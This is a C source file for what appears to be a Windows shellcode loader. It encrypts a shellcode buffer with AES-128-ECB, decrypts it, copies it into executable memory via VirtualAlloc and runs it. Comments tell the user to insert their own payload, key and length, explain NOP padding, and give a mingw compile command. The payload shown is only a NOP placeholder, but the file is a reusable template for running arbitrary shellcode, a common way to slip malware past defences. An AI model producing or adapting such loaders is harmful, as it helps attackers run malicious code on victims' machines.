#include <stdlib.h>
#include <stdio.h>
#include <openssl/evp.h>
#include <windows.h>

#define AES_KEY_SIZE 16

static const unsigned char KEY[AES_KEY_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};
static const unsigned char SHELLCODE[] = "\x90\x90\x90\x90";
static const size_t SHELLCODE_LENGTH = 464;

// update the SHELLCODE_LENGTH & KEY & SHELLCODE
// IMPORTANT : to know if you have to add NOP at the end of the payload, do SHELLCODE_LENGTH % 16
// example :  120 % 16 = 8, now 8 * 16, it will give you  128,  so you need to have 8 x\90 at the end of the payload and set size to 128
// to compile: x86_64-w64-mingw32-g++.exe -o Z:\dev\selha.exe Z:\dev\aes-loader-stageless.c -I "C:\Program Files\OpenSSL-Win64\include" -lcrypto -L "C:\Program Files\OpenSSL-Win64\lib"


/* function for debug
void hexdump(const unsigned char* ba, size_t size)
{
	for(int i=0 ; i<size ; i+=16)
	{
		for(int j=0 ; j<16 ; j++)
		{
			printf("%02x ", ba[i + j]);
		}
		printf("\n");
	}
}
*/

int encrypt(unsigned char* out, const unsigned char* in, size_t size, const unsigned char* key)
{
    EVP_CIPHER_CTX* ctx;
    int length = 0;

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    EVP_EncryptUpdate(ctx, out, &length, in, size);

    EVP_CIPHER_CTX_free(ctx);
    return length;
}

int decrypt(unsigned char* out, const unsigned char* in, size_t size, const unsigned char* key)
{
  EVP_CIPHER_CTX* ctx;
  int length = 0;

  ctx = EVP_CIPHER_CTX_new();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
  EVP_DecryptUpdate(ctx, out, &length, in, size);

  EVP_CIPHER_CTX_free(ctx);
  return length;
}

void handoff(const unsigned char* shellcode, size_t size)
{
  void* executable_page;

  executable_page = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(executable_page, shellcode, size);
  printf("%d\n", memcmp(executable_page, SHELLCODE, SHELLCODE_LENGTH));

  ((void (*)()) executable_page)();
}

int main()
{
  unsigned char* ciphered, *deciphered;

  ciphered = (unsigned char*) malloc(SHELLCODE_LENGTH);
  deciphered = (unsigned char*) malloc(SHELLCODE_LENGTH);

  encrypt(ciphered, SHELLCODE, SHELLCODE_LENGTH, KEY);

  // decrypt + handoff
  decrypt(deciphered, ciphered, SHELLCODE_LENGTH, KEY);
  // hexdump(deciphered, SHELLCODE_LENGTH);
  handoff(deciphered, SHELLCODE_LENGTH);

  return 0;
}

